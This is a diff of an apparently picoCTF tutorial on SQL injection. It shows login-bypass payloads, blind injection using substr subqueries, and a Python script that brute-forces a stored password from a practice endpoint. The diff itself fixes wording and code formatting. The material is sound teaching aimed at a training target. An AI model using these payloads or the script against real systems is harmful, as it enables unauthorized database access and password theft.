@@ -150,7 +150,7 @@ The objective of the basic SQL injection we are learning, is trying to inject an
 
 "[lime]#SELECT * FROM user where name='#".$name.""[lime]#' and password='#".$password.""[lime]#';#"
 
-The red part of the query, will be concatenated with the value of the variables to conform the final query. Let's suppose that $name is equal to "samuel", and $password is equal to "hello", the query would result in
+The green part of the query will be concatenated with the value of the variables to form the final query. Let's suppose that $name is equal to "samuel", and $password is equal to "hello", the query would result in
 
 SELECT * FROM user where name='samuel' and password='hello';
 
@@ -201,7 +201,7 @@ So far, you know that if you inject:
 
 *' or '1'='1*
 
-It will return results, but you are not learning any information. We know two column names, 'username' and password. For this example, suppose you know a user called 'picoctf' and you to get the password from that user. To narrow down the query to the row in which the user 'picoctf' information is stored, you could use:
+It will return results, but you are not learning any information. We know two column names, 'username' and password. For this example, suppose you know a user called 'picoctf' and you want to get the password from that user. To narrow down the query to the row in which the user 'picoctf' information is stored, you could use:
 
 *' or username='picoctf*
 
@@ -213,7 +213,7 @@ image::images/3image14.png[image,width=624,height=130]
 
 Remember that in our injection, if the part at the right of the "or" is true, it will return results. It is true that username is equal to 'picoctf' only in the row on the picoctf!
 
-Now we will add the part that compares the first character of the password. We can do that using an embedded query. An embedded query is a query inside a query. Our embedded query highlighted in red, will simply return the first character of the password. We will compare that first character with the character 'a', so we are guessing that the first character is 'a':
+Now we will add the part that compares the first character of the password. We can do that using an embedded query. An embedded query is a query inside a query. Our embedded query highlighted in green, will simply return the first character of the password. We will compare that first character with the character 'a', so we are guessing that the first character is 'a':
 
 *' or username='picoctf' and [lime]#(select substr(password, 1, 1))#='a*
 
@@ -236,20 +236,26 @@ image::images/3image5.png[image,width=624,height=185]
 You could possibly find the whole password manually, but it would take too much effort. On the other hand, you may want to obtain all the passwords in the database, or even all the fields from the database! This same process can be applied for any field… In most of the SQL engines there is a system table that contains the names of all tables and columns, so once we find a SQL injections databases we might be able to leak the whole database. For this exercise we will only obtain one password. To be more efficient, we will write a python script that does the job for us. Suppose we found the name of the table in some way. The script is the following:
 
 [source, python]
+----
 import requests
 from string import printable
+
 accum = ""
 for i in range(40):
   for letter in printable:
     accum += letter
+
     r = requests.post("https://primer.picoctf.org/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
-    + letter+"'=( select substr(binary password,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")
+    + letter +"'=( select substr(binary password,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")
+
     if 'NOTHING FOUND...' in r.text:
       accum = accum[:-1]
       print("nope")
     else:
       print(f"We found the character: {letter}")
+
 print(accum)
+----
 
 
 This script is just one of the many ways in which a blind SQL injection is done. With your knowledge of Python and SQL, you should be able to understand the script if you read it carefully. Note the following:
@@ -262,7 +268,7 @@ This script is just one of the many ways in which a blind SQL injection is done.
 
 * We put the *select '* at the end of the query to handle the closing single quote.
 
-* 'NOTHING FOUND...' Is the message printed in the html, so if that is present in the html
+* 'NOTHING FOUND...' Is the message printed in the html, so if that is present in the html then a wrong letter was guessed.
 
 * To clear your doubts, experiment in the SQL editor with similar queries, or do prints on the python script to make sure you understand every part of it.
 
